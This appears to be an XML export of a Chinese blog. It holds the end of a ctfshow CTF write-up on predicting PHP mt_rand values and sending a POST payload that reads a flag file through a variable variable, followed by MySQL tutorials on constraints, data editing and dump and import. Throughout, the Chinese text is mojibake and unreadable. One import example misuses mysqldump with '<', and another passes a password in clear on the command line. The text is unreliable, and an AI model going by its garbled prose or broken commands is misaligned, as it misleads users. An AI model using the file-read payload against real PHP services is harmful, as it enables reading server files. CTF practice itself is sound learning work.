<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>($&#123;<span class="hljs-variable">$_POST</span>[<span class="hljs-title function_ invoke__">mt_rand</span>()]&#125;);<br></code></pre></td></tr></table></figure>


<p>æœ¬åœ°æ„å†™å‡ ä¸ªmt_rand()ç»“æœ,æºç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-string">&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;</span>,<span class="hljs-number">17</span>,<span class="hljs-number">7</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°ç»“æœæ˜¯å›ºå®šçš„ï¼Œè¿™å°±æ˜¯phpçš„ä¼ªéšæœºæ•°é—®é¢˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">1160121479</span>&lt;/br&gt;<br><span class="hljs-number">954576979</span>&lt;/br&gt;<br><span class="hljs-number">1277894509</span>&lt;/br&gt;<br></code></pre></td></tr></table></figure>

<p>POSTä¼ å‚ï¼Œå‚æ•°åä¸ºæ–°çš„éšæœºæ•°ç”Ÿæˆå™¨ç”Ÿæˆçš„ç¬¬äºŒä¸ªéšæœºæ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>($&#123;<span class="hljs-variable">$_POST</span>[<span class="hljs-title function_ invoke__">mt_rand</span>()]&#125;);<br></code></pre></td></tr></table></figure>


<p>æœ€åPOSTä¼ ï¼škey&#x3D;954576979&amp;1277894509&#x3D;filename</p>
<p>å› ä¸º<code>$_POST[mt_rand()]</code>å‰è¿˜æœ‰ä¸€ä¸ª<code>$</code>,æ‰€ä»¥ä¼ å…¥çš„<code>filename</code>ä¼šå˜æˆ<code>$filename</code>,è¿™æ ·å°±è¯»åˆ°äº†flag</p>
]]></content>
      <categories>
        <category>ctfshow-webå…¥é—¨</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
        <tag>webå…¥é—¨</tag>
      </tags>
  </entry>
  <entry>
    <title>mysqlä»å…¥é—¨åˆ°å…¥åœŸï¼ˆå››ï¼‰</title>
    <url>/posts/8ef1554f/</url>
    <content><![CDATA[<h1 id="çº¦æŸ"><a href="#çº¦æŸ" class="headerlink" title="çº¦æŸ"></a>çº¦æŸ</h1><h2 id="ä¸»é”®çº¦æŸ"><a href="#ä¸»é”®çº¦æŸ" class="headerlink" title="ä¸»é”®çº¦æŸ"></a>ä¸»é”®çº¦æŸ</h2><blockquote>
<p>ä¸»é”®ï¼ˆPRIMARY KEYï¼‰çš„å®Œæ•´ç§°å‘¼æ˜¯â€œä¸»é”®çº¦æŸâ€ï¼Œæ˜¯ MySQL ä¸­ä½¿ç”¨æœ€ä¸ºé¢‘ç¹çš„çº¦æŸã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸ºäº†ä¾¿äº DBMS æ›´å¿«çš„æŸ¥æ‰¾åˆ°è¡¨ä¸­çš„è®°å½•ï¼Œéƒ½ä¼šåœ¨è¡¨ä¸­è®¾ç½®ä¸€ä¸ªä¸»é”®ã€‚</p>
</blockquote>
<p>ä¸»é”®åˆ†ä¸ºå•å­—æ®µä¸»é”®å’Œå¤šå­—æ®µè”åˆä¸»é”®</p>
<p>å…³é”®å‚æ•°<code>primary key</code></p>
<h3 id="å•å­—æ®µä¸»é”®"><a href="#å•å­—æ®µä¸»é”®" class="headerlink" title="å•å­—æ®µä¸»é”®"></a>å•å­—æ®µä¸»é”®</h3><p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql4-1.jpg"></p>
<h3 id="å¤šå­—æ®µä¸»é”®"><a href="#å¤šå­—æ®µä¸»é”®" class="headerlink" title="å¤šå­—æ®µä¸»é”®"></a>å¤šå­—æ®µä¸»é”®</h3><p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql4-2.jpg"></p>
<h2 id="è‡ªå¢é•¿"><a href="#è‡ªå¢é•¿" class="headerlink" title="è‡ªå¢é•¿"></a>è‡ªå¢é•¿</h2><blockquote>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒAUTO_INCREMENT çš„åˆå§‹å€¼æ˜¯ 1ï¼Œæ¯æ–°å¢ä¸€æ¡è®°å½•ï¼Œå­—æ®µå€¼è‡ªåŠ¨åŠ  1ã€‚<br>ä¸€ä¸ªè¡¨ä¸­åªèƒ½æœ‰ä¸€ä¸ªå­—æ®µä½¿ç”¨ AUTO_INCREMENT çº¦æŸï¼Œä¸”è¯¥å­—æ®µå¿…é¡»æœ‰å”¯ä¸€ç´¢å¼•ï¼Œä»¥é¿å…åºå·é‡å¤ï¼ˆå³ä¸ºä¸»é”®æˆ–ä¸»é”®çš„ä¸€éƒ¨åˆ†ï¼‰ã€‚<br>AUTO_INCREMENT çº¦æŸçš„å­—æ®µå¿…é¡»å…·å¤‡ NOT NULL å±æ€§ã€‚<br>AUTO_INCREMENT çº¦æŸçš„å­—æ®µåªèƒ½æ˜¯æ•´æ•°ç±»å‹ï¼ˆTINYINTã€SMALLINTã€INTã€BIGINT ç­‰ï¼‰ã€‚<br>AUTO_INCREMENT çº¦æŸå­—æ®µçš„æœ€å¤§å€¼å—è¯¥å­—æ®µçš„æ•°æ®ç±»å‹çº¦æŸï¼Œå¦‚æœè¾¾åˆ°ä¸Šé™ï¼ŒAUTO_INCREMENT å°±ä¼šå¤±æ•ˆã€‚</p>
</blockquote>
<p>å…³é”®å‚æ•°<code>auto_increment</code></p>
<h3 id="ä¸»é”®è‡ªå¢é•¿"><a href="#ä¸»é”®è‡ªå¢é•¿" class="headerlink" title="ä¸»é”®è‡ªå¢é•¿"></a>ä¸»é”®è‡ªå¢é•¿</h3><p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql4-3.jpg"></p>
<h3 id="æŒ‡å®šå¼€å§‹çš„å€¼"><a href="#æŒ‡å®šå¼€å§‹çš„å€¼" class="headerlink" title="æŒ‡å®šå¼€å§‹çš„å€¼"></a>æŒ‡å®šå¼€å§‹çš„å€¼</h3><p>ä¾‹å¦‚ä»100å¼€å§‹è‡ªå¢<br><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql4-4.jpg"></p>
<h2 id="å”¯ä¸€çº¦æŸ"><a href="#å”¯ä¸€çº¦æŸ" class="headerlink" title="å”¯ä¸€çº¦æŸ"></a>å”¯ä¸€çº¦æŸ</h2><blockquote>
<p>MySQL å”¯ä¸€çº¦æŸï¼ˆUnique Keyï¼‰æ˜¯æŒ‡æ‰€æœ‰è®°å½•ä¸­å­—æ®µçš„å€¼ä¸èƒ½é‡å¤å‡ºç°ã€‚ä¾‹å¦‚ï¼Œä¸º id å­—æ®µåŠ ä¸Šå”¯ä¸€æ€§çº¦æŸåï¼Œæ¯æ¡è®°å½•çš„ id å€¼éƒ½æ˜¯å”¯ä¸€çš„ï¼Œä¸èƒ½å‡ºç°é‡å¤çš„æƒ…å†µã€‚å¦‚æœå…¶ä¸­ä¸€æ¡è®°å½•çš„ id å€¼ä¸ºâ€˜0001â€™ï¼Œé‚£ä¹ˆè¯¥è¡¨ä¸­å°±ä¸èƒ½å‡ºç°å¦ä¸€æ¡è®°å½•çš„ id å€¼ä¹Ÿä¸ºâ€˜0001â€™ã€‚</p>
</blockquote>
<blockquote>
<p>å”¯ä¸€çº¦æŸä¸ä¸»é”®çº¦æŸç›¸ä¼¼çš„æ˜¯å®ƒä»¬éƒ½å¯ä»¥ç¡®ä¿åˆ—çš„å”¯ä¸€æ€§ã€‚ä¸åŒçš„æ˜¯ï¼Œå”¯ä¸€çº¦æŸåœ¨ä¸€ä¸ªè¡¨ä¸­å¯æœ‰å¤šä¸ªï¼Œå¹¶ä¸”è®¾ç½®å”¯ä¸€çº¦æŸçš„åˆ—å…è®¸æœ‰ç©ºå€¼ï¼Œä½†æ˜¯åªèƒ½æœ‰ä¸€ä¸ªç©ºå€¼ã€‚è€Œä¸»é”®çº¦æŸåœ¨ä¸€ä¸ªè¡¨ä¸­åªèƒ½æœ‰ä¸€ä¸ªï¼Œä¸”ä¸å…è®¸æœ‰ç©ºå€¼ã€‚æ¯”å¦‚ï¼Œåœ¨ç”¨æˆ·ä¿¡æ¯è¡¨ä¸­ï¼Œä¸ºäº†é¿å…è¡¨ä¸­ç”¨æˆ·åé‡åï¼Œå¯ä»¥æŠŠç”¨æˆ·åè®¾ç½®ä¸ºå”¯ä¸€çº¦æŸã€‚</p>
</blockquote>
<p>å…³é”®å‚æ•°<code>unique</code></p>
<p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql4-5.jpg"></p>
<h2 id="éç©ºçº¦æŸ"><a href="#éç©ºçº¦æŸ" class="headerlink" title="éç©ºçº¦æŸ"></a>éç©ºçº¦æŸ</h2><blockquote>
<p>MySQL éç©ºçº¦æŸï¼ˆNOT NULLï¼‰æŒ‡å­—æ®µçš„å€¼ä¸èƒ½ä¸ºç©ºã€‚å¯¹äºä½¿ç”¨äº†éç©ºçº¦æŸçš„å­—æ®µï¼Œå¦‚æœç”¨æˆ·åœ¨æ·»åŠ æ•°æ®æ—¶æ²¡æœ‰æŒ‡å®šå€¼ï¼Œæ•°æ®åº“ç³»ç»Ÿå°±ä¼šæŠ¥é”™ã€‚å¯ä»¥é€šè¿‡ CREATE TABLE æˆ– ALTER TABLE è¯­å¥å®ç°ã€‚åœ¨è¡¨ä¸­æŸä¸ªåˆ—çš„å®šä¹‰ååŠ ä¸Šå…³é”®å­— NOT NULL ä½œä¸ºé™å®šè¯ï¼Œæ¥çº¦æŸè¯¥åˆ—çš„å–å€¼ä¸èƒ½ä¸ºç©ºã€‚</p>
</blockquote>
<blockquote>
<p>æ¯”å¦‚ï¼Œåœ¨ç”¨æˆ·ä¿¡æ¯è¡¨ä¸­ï¼Œå¦‚æœä¸æ·»åŠ ç”¨æˆ·åï¼Œé‚£ä¹ˆè¿™æ¡ç”¨æˆ·ä¿¡æ¯å°±æ˜¯æ— æ•ˆçš„ï¼Œè¿™æ—¶å°±å¯ä»¥ä¸ºç”¨æˆ·åå­—æ®µè®¾ç½®éç©ºçº¦æŸã€‚</p>
</blockquote>
<p>å…³é”®å‚æ•°<code>not null</code></p>
<p>é™¤äº†emailï¼Œå…¶ä»–ä¸å…è®¸æœ‰ç©ºå€¼<br><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql4-6.jpg"></p>
<h2 id="é»˜è®¤å€¼"><a href="#é»˜è®¤å€¼" class="headerlink" title="é»˜è®¤å€¼"></a>é»˜è®¤å€¼</h2><blockquote>
<p>é»˜è®¤å€¼ï¼ˆDefaultï¼‰çš„å®Œæ•´ç§°å‘¼æ˜¯â€œé»˜è®¤å€¼çº¦æŸï¼ˆDefault Constraintï¼‰â€ï¼Œç”¨æ¥æŒ‡å®šæŸåˆ—çš„é»˜è®¤å€¼ã€‚åœ¨è¡¨ä¸­æ’å…¥ä¸€æ¡æ–°è®°å½•æ—¶ï¼Œå¦‚æœæ²¡æœ‰ä¸ºæŸä¸ªå­—æ®µèµ‹å€¼ï¼Œç³»ç»Ÿå°±ä¼šè‡ªåŠ¨ä¸ºè¿™ä¸ªå­—æ®µæ’å…¥é»˜è®¤å€¼ã€‚</p>
</blockquote>
<p>å…³é”®å‚æ•°<code>default</code></p>
<p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql4-7.jpg"></p>
<h2 id="å¤–é”®çº¦æŸ"><a href="#å¤–é”®çº¦æŸ" class="headerlink" title="å¤–é”®çº¦æŸ"></a>å¤–é”®çº¦æŸ</h2><blockquote>
<p>MySQL å¤–é”®çº¦æŸï¼ˆFOREIGN KEYï¼‰æ˜¯è¡¨çš„ä¸€ä¸ªç‰¹æ®Šå­—æ®µï¼Œç»å¸¸ä¸ä¸»é”®çº¦æŸä¸€èµ·ä½¿ç”¨ã€‚å¯¹äºä¸¤ä¸ªå…·æœ‰å…³è”å…³ç³»çš„è¡¨è€Œè¨€ï¼Œç›¸å…³è”å­—æ®µä¸­ä¸»é”®æ‰€åœ¨çš„è¡¨å°±æ˜¯ä¸»è¡¨ï¼ˆçˆ¶è¡¨ï¼‰ï¼Œå¤–é”®æ‰€åœ¨çš„è¡¨å°±æ˜¯ä»è¡¨ï¼ˆå­è¡¨ï¼‰ã€‚</p>
</blockquote>
<p>å…³é”®å‚æ•°<code>foreign key() references table()</code></p>
<p>è¡¨1ï¼š</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">MariaDB [test]&gt; desc table1;<br>+-------+-------------+------+-----+---------+-------+<br>|<span class="hljs-string"> Field </span>|<span class="hljs-string"> Type        </span>|<span class="hljs-string"> Null </span>|<span class="hljs-string"> Key </span>|<span class="hljs-string"> Default </span>|<span class="hljs-string"> Extra </span>|<br>+-------+-------------+------+-----+---------+-------+<br>|<span class="hljs-string"> id    </span>|<span class="hljs-string"> int(11)     </span>|<span class="hljs-string"> NO   </span>|<span class="hljs-string"> PRI </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> name  </span>|<span class="hljs-string"> varchar(15) </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> age   </span>|<span class="hljs-string"> int(11)     </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>+-------+-------------+------+-----+---------+-------+<br>3 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>

<p>è¡¨äºŒï¼š</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">MariaDB [test]&gt; create table table2(id int primary key,age int,name varchar(12),foreign key(age) references table1(id));<br>Query OK, 0 rows affected (0.00 sec)<br><br>MariaDB [test]&gt; desc table2;<br>+-------+-------------+------+-----+---------+-------+<br>|<span class="hljs-string"> Field </span>|<span class="hljs-string"> Type        </span>|<span class="hljs-string"> Null </span>|<span class="hljs-string"> Key </span>|<span class="hljs-string"> Default </span>|<span class="hljs-string"> Extra </span>|<br>+-------+-------------+------+-----+---------+-------+<br>|<span class="hljs-string"> id    </span>|<span class="hljs-string"> int(11)     </span>|<span class="hljs-string"> NO   </span>|<span class="hljs-string"> PRI </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> age   </span>|<span class="hljs-string"> int(11)     </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string"> MUL </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> name  </span>|<span class="hljs-string"> varchar(12) </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>+-------+-------------+------+-----+---------+-------+<br>3 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>

<blockquote>
<p>æ³¨æ„ï¼šä»è¡¨çš„å¤–é”®å…³è”çš„å¿…é¡»æ˜¯ä¸»è¡¨çš„ä¸»é”®ï¼Œä¸”ä¸»é”®å’Œå¤–é”®çš„æ•°æ®ç±»å‹å¿…é¡»ä¸€è‡´ã€‚ä¾‹å¦‚ï¼Œä¸¤è€…éƒ½æ˜¯ INT ç±»å‹ï¼Œæˆ–è€…éƒ½æ˜¯ CHAR ç±»å‹ã€‚å¦‚æœä¸æ»¡è¶³è¿™æ ·çš„è¦æ±‚ï¼Œåœ¨åˆ›å»ºä»è¡¨æ—¶ï¼Œå°±ä¼šå‡ºç°â€œERROR 1005(HY000): Canâ€™t create tableâ€é”™è¯¯ã€‚</p>
</blockquote>
<h2 id="æ£€æŸ¥çº¦æŸ"><a href="#æ£€æŸ¥çº¦æŸ" class="headerlink" title="æ£€æŸ¥çº¦æŸ"></a>æ£€æŸ¥çº¦æŸ</h2><blockquote>
<p>MySQL æ£€æŸ¥çº¦æŸï¼ˆCHECKï¼‰æ˜¯ç”¨æ¥æ£€æŸ¥æ•°æ®è¡¨ä¸­å­—æ®µå€¼æœ‰æ•ˆæ€§çš„ä¸€ç§æ‰‹æ®µï¼Œå¯ä»¥é€šè¿‡ CREATE TABLE æˆ– ALTER TABLE è¯­å¥å®ç°ã€‚è®¾ç½®æ£€æŸ¥çº¦æŸæ—¶è¦æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œè®¾ç½®ï¼Œè¿™æ ·èƒ½å¤Ÿå‡å°‘æ— æ•ˆæ•°æ®çš„è¾“å…¥ã€‚</p>
</blockquote>
<blockquote>
<p>é»˜è®¤å€¼çº¦æŸå’Œéç©ºçº¦æŸä¹Ÿå¯çœ‹ä½œæ˜¯ç‰¹æ®Šçš„æ£€æŸ¥çº¦æŸã€‚</p>
</blockquote>
<p>å…³é”®å‚æ•°<code>check</code></p>
<p>ä½†æ˜¯è®¾ç½®äº†æ£€æŸ¥çº¦æŸåå¹¶ä¸ä¼šç”Ÿæ•ˆ</p>
<ul>
<li>checkä¸ç”Ÿæ•ˆæ˜¯ä¸ºmysqlçš„bug *<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">å®˜ç½‘åŸæ–‡:<br><span class="hljs-keyword">CHECK</span><br>The <span class="hljs-keyword">CHECK</span> clause <span class="hljs-keyword">is</span> parsed but ignored <span class="hljs-keyword">by</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">storage</span> engines. See Section <span class="hljs-number">1.8</span><span class="hljs-number">.2</span><span class="hljs-number">.3</span>, â€œ<span class="hljs-keyword">Foreign Key</span> Differencesâ€.<br></code></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>è§£å†³æ–¹æ³•ï¼š</p>
</blockquote>
<blockquote>
<p>1ï¼šå¦‚æœè¦è®¾ç½®CHECKçº¦æŸçš„å­—æ®µèŒƒå›´å°ï¼Œå¹¶ä¸”æ¯”è¾ƒå®¹æ˜“åˆ—ä¸¾å…¨éƒ¨çš„å€¼ï¼Œå°±å¯ä»¥è€ƒè™‘å°†è¯¥å­—æ®µçš„ç±»å‹è®¾ç½®ä¸ºæšä¸¾ç±»å‹ enum()æˆ–é›†åˆç±»å‹set()ã€‚</p>
</blockquote>
<blockquote>
<p>2:å¦‚æœéœ€è¦è®¾ç½®CHECKçº¦æŸçš„å­—æ®µèŒƒå›´å¤§ï¼Œä¸”åˆ—ä¸¾å…¨éƒ¨å€¼æ¯”è¾ƒå›°éš¾ï¼Œæ¯”å¦‚æ•´æ•°æˆ–è€…æŸä¸€åŒºé—´ï¼Œé‚£å°±åªèƒ½ä½¿ç”¨è§¦å‘å™¨æ¥ä»£æ›¿çº¦æŸå®ç°æ•°æ®çš„æœ‰æ•ˆæ€§äº†</p>
</blockquote>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
        <tag>mysql</tag>
        <tag>æ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>mysqlä»å…¥é—¨åˆ°å…¥åœŸï¼ˆä¸‰ï¼‰</title>
    <url>/posts/39dc4c2a/</url>
    <content><![CDATA[<h1 id="æ·»åŠ æ•°æ®"><a href="#æ·»åŠ æ•°æ®" class="headerlink" title="æ·»åŠ æ•°æ®"></a>æ·»åŠ æ•°æ®</h1><figure class="highlight lasso"><table><tr><td class="code"><pre><code class="hljs lasso">INSERT <span class="hljs-keyword">INTO</span> table_name ( field1, field2,<span class="hljs-params">...</span>fieldN ) VALUES ( value1, value2,<span class="hljs-params">...</span>valueN );<br></code></pre></td></tr></table></figure>
<blockquote>
<p>å¦‚æœæ•°æ®æ˜¯å­—ç¬¦å‹ï¼Œå¿…é¡»ä½¿ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·ï¼Œå¦‚ï¼šâ€valueâ€ã€‚</p>
</blockquote>
<h1 id="åˆ é™¤æ•°æ®"><a href="#åˆ é™¤æ•°æ®" class="headerlink" title="åˆ é™¤æ•°æ®"></a>åˆ é™¤æ•°æ®</h1><p>åˆ é™¤<code>ttt</code>è¡¨ä¸­<code>id</code>ç­‰äº<code>1</code>çš„æ•°æ®</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">delete <span class="hljs-keyword">from</span> ttt <span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>

<h1 id="æ’å…¥å­—æ®µ"><a href="#æ’å…¥å­—æ®µ" class="headerlink" title="æ’å…¥å­—æ®µ"></a>æ’å…¥å­—æ®µ</h1><blockquote>
<p>alter table [è¡¨æ ¼å] Add column [è¦æ·»åŠ çš„å­—æ®µ] [å­—æ®µç±»å‹] AFTER [å“ªä¸ªå­—æ®µåé¢åŠ ];</p>
</blockquote>
<p>åœ¨<code>Password</code>åæ’å…¥ä¸€ä¸ª<code>char(8)</code>ç±»å‹çš„<code>host</code>å­—æ®µ<br><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql3-1.jpg"></p>
<h2 id="æ’å…¥å­—æ®µå¹¶åˆ¤æ–­æœ‰æ•ˆå€¼"><a href="#æ’å…¥å­—æ®µå¹¶åˆ¤æ–­æœ‰æ•ˆå€¼" class="headerlink" title="æ’å…¥å­—æ®µå¹¶åˆ¤æ–­æœ‰æ•ˆå€¼"></a>æ’å…¥å­—æ®µå¹¶åˆ¤æ–­æœ‰æ•ˆå€¼</h2><blockquote>
<p>CHECKçº¦æŸå°±æ˜¯å½“å‘è¡¨ä¸­æ’å…¥ä¸€è¡Œæˆ–æ›´æ–°ä¸€è¡Œæ•°æ®æ—¶è¿›è¡ŒCHECKçº¦æŸæ£€æŸ¥ï¼ŒCHECKæ¥å—ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå¦‚æœè¿™ä¸ªè¡¨è¾¾å¼ä¸ºTRUEåˆ™å…è®¸æ’å…¥ï¼Œå¦‚æœè¿™ä¸ªè¡¨è¾¾å¼ä¸ºFALSEåˆ™æ‹’ç»æ’å…¥ï¼Œåœ¨MariaDB10.2ç‰ˆæœ¬æ‰å¼€å§‹æ”¯æŒCHECKã€‚</p>
</blockquote>
<blockquote>
<p>alter table [è¡¨æ ¼å] add [è¦æ·»åŠ çš„å­—æ®µ] [å­—æ®µç±»å‹] [checkçº¦æŸ] after [å“ªä¸ªå­—æ®µåé¢åŠ ];</p>
</blockquote>
<p>è¦æ»¡è¶³æ¡ä»¶age&#x3D;21æˆ–22æ‰å…è®¸æ’å…¥<br><code>alter table userinfo add age int check(age=21 or age=22) after name;</code></p>
<h1 id="åˆ é™¤å­—æ®µ"><a href="#åˆ é™¤å­—æ®µ" class="headerlink" title="åˆ é™¤å­—æ®µ"></a>åˆ é™¤å­—æ®µ</h1><blockquote>
<p>alter table [è¡¨æ ¼å] drop column [è¦åˆ é™¤çš„å­—æ®µå];</p>
</blockquote>
<h1 id="æ›´æ–°æ•°æ®"><a href="#æ›´æ–°æ•°æ®" class="headerlink" title="æ›´æ–°æ•°æ®"></a>æ›´æ–°æ•°æ®</h1><blockquote>
<p>update [è¡¨æ ¼å] set [ä¿®æ”¹çš„å†…å®¹] where [æ¡ä»¶];</p>
</blockquote>
<h1 id="ä¸­æ–‡æ•°æ®æ”¯æŒï¼ˆä¿®æ”¹ç¼–ç æ ¼å¼ï¼‰"><a href="#ä¸­æ–‡æ•°æ®æ”¯æŒï¼ˆä¿®æ”¹ç¼–ç æ ¼å¼ï¼‰" class="headerlink" title="ä¸­æ–‡æ•°æ®æ”¯æŒï¼ˆä¿®æ”¹ç¼–ç æ ¼å¼ï¼‰"></a>ä¸­æ–‡æ•°æ®æ”¯æŒï¼ˆä¿®æ”¹ç¼–ç æ ¼å¼ï¼‰</h1><p>æ­£å¸¸æ’å…¥ä¸€æ¡ä¸­æ–‡æ•°æ®ä¼šæ˜¾ç¤ºä¸å‡ºæ¥ï¼Œå› ä¸ºé»˜è®¤ç¼–ç æ˜¯latin1<br><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql3-2.jpg"></p>
<p>æŸ¥çœ‹æ•°æ®åº“é»˜è®¤ç¼–ç <br><code>show variables like &#39;char%&#39;;</code></p>
<p>æŸ¥çœ‹æŒ‡å®šæ•°æ®åº“é»˜è®¤ç¼–ç <br><code>show create database [æ•°æ®åº“];</code></p>
<p>åˆ›å»ºæ•°æ®åº“æŒ‡å®šå­—ç¬¦é›†<br><code>create database [æ•°æ®åº“åç§°] character set utf8;</code></p>
<p>åˆ›å»ºè¡¨æŒ‡å®šå­—ç¬¦é›†<br><code>create table [è¡¨åå’Œå­—æ®µ] charset=utf8; </code></p>
<h1 id="å¯¼å…¥å¯¼å‡ºåº“å’Œè¡¨"><a href="#å¯¼å…¥å¯¼å‡ºåº“å’Œè¡¨" class="headerlink" title="å¯¼å…¥å¯¼å‡ºåº“å’Œè¡¨"></a>å¯¼å…¥å¯¼å‡ºåº“å’Œè¡¨</h1><h2 id="å¯¼å‡ºæ•°æ®åº“å’Œè¡¨"><a href="#å¯¼å‡ºæ•°æ®åº“å’Œè¡¨" class="headerlink" title="å¯¼å‡ºæ•°æ®åº“å’Œè¡¨"></a>å¯¼å‡ºæ•°æ®åº“å’Œè¡¨</h2><p>å¯¼å‡º<code>aaa</code>åº“ï¼Œä»¥<code>aaa.sql</code>ä¸ºæ–‡ä»¶åä¿å­˜</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><code class="hljs x86asm">mysqldump -u root -p123 <span class="hljs-keyword">aaa</span> &gt; <span class="hljs-keyword">aaa</span><span class="hljs-number">.</span>sql<br></code></pre></td></tr></table></figure>

<p>å¯¼å‡º<code>aaa.ttt</code>è¡¨ï¼Œä»¥<code>ttt.sql</code>ä¸ºæ–‡ä»¶åä¿å­˜</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mysqldump</span> -u root -p123 aaa ttt &gt; ttt.sql<br></code></pre></td></tr></table></figure>

<h2 id="å¯¼å…¥æ•°æ®åº“å’Œè¡¨"><a href="#å¯¼å…¥æ•°æ®åº“å’Œè¡¨" class="headerlink" title="å¯¼å…¥æ•°æ®åº“å’Œè¡¨"></a>å¯¼å…¥æ•°æ®åº“å’Œè¡¨</h2><p>å¯¼å…¥<code>aaa</code>è¿™ä¸ªæ•°æ®åº“<br>æ³¨æ„è¦å…ˆåˆ›å»ºä¸€ä¸ª<code>aaa</code>åº“</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><code class="hljs x86asm">mysqldump -u root -p123 <span class="hljs-keyword">aaa</span> &lt; <span class="hljs-keyword">aaa</span><span class="hljs-number">.</span>sql<br></code></pre></td></tr></table></figure>

<p>å¯¼å…¥<code>ttt</code>è¡¨</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">MariaDB [(none)]&gt; use aaa;                      <span class="hljs-regexp">//</span>è¿›å…¥æ•°æ®åº“<br>MariaDB [aaa]&gt; source <span class="hljs-regexp">/root/</span>ttt.sql           <span class="hljs-regexp">//</span>å¯¼å…¥sql<br></code></pre></td></tr></table></figure>
<h2 id="å¯¼å…¥txt"><a href="#å¯¼å…¥txt" class="headerlink" title="å¯¼å…¥txt"></a>å¯¼å…¥txt</h2><p>è¡¨ç»“æ„</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">MariaDB [test]&gt; desc sj;<br>+----------+-------------+------+-----+---------+-------+<br>|<span class="hljs-string"> Field    </span>|<span class="hljs-string"> Type        </span>|<span class="hljs-string"> Null </span>|<span class="hljs-string"> Key </span>|<span class="hljs-string"> Default </span>|<span class="hljs-string"> Extra </span>|<br>+----------+-------------+------+-----+---------+-------+<br>|<span class="hljs-string"> ID       </span>|<span class="hljs-string"> int(11)     </span>|<span class="hljs-string"> NO   </span>|<span class="hljs-string"> PRI </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> Name     </span>|<span class="hljs-string"> varchar(10) </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> Day      </span>|<span class="hljs-string"> date        </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> Password </span>|<span class="hljs-string"> varchar(16) </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span 